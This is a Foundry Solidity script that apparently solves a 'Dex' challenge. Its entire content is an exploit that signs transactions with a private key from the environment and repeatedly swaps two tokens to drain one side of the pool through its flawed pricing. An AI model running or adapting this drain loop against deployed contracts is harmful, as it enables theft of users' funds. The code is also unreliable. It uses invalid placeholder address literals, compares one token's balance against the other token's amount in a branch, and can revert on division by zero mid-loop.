// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";  // Import the Dex contract
import "../lib/forge-std/src/Script.sol";
import "../lib/openzeppelin-contracts-08/contracts/token/ERC20/IERC20.sol";

contract DexExploit is Script {
    Dex public dexInstance = Dex(0xYourInstanceAddressHere);  // Replace with actual instance address
    IERC20 public token1;
    IERC20 public token2;

    address private player = 0xYourPlayerAddressHere;  // Replace with your player address

    function run() external {
        // Start broadcasting transactions with the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Get token addresses from the DEX contract
        token1 = IERC20(dexInstance.token1());
        token2 = IERC20(dexInstance.token2());

        // Start swapping tokens until one of the token balances is drained
        while (token1.balanceOf(address(dexInstance)) > 0 && token2.balanceOf(address(dexInstance)) > 0) {
            // Calculate the amount of token2 the player can get
            uint256 token2Needed = (token1.balanceOf(player) * token2.balanceOf(address(dexInstance))) / token1.balanceOf(address(dexInstance));

            if (token1.balanceOf(address(dexInstance)) >= token2Needed) {
                token1.approve(address(dexInstance), token1.balanceOf(player));
                dexInstance.swap(address(token1), address(token2), token1.balanceOf(player));
            } else {
                uint256 availableToken1 = token1.balanceOf(address(dexInstance));
                token1.approve(address(dexInstance), availableToken1);
                dexInstance.swap(address(token1), address(token2), availableToken1);
            }

            // Now calculate the amount of token1 the player can get
            uint256 token1Needed = (token2.balanceOf(player) * token1.balanceOf(address(dexInstance))) / token2.balanceOf(address(dexInstance));

            if (token2.balanceOf(address(dexInstance)) >= token1Needed) {
                token2.approve(address(dexInstance), token2.balanceOf(player));
                dexInstance.swap(address(token2), address(token1), token2.balanceOf(player));
            } else {
                uint256 availableToken2 = token2.balanceOf(address(dexInstance));
                token2.approve(address(dexInstance), availableToken2);
                dexInstance.swap(address(token2), address(token1), availableToken2);
            }
        }

        // Stop broadcasting after transactions are complete
        vm.stopBroadcast();
    }
}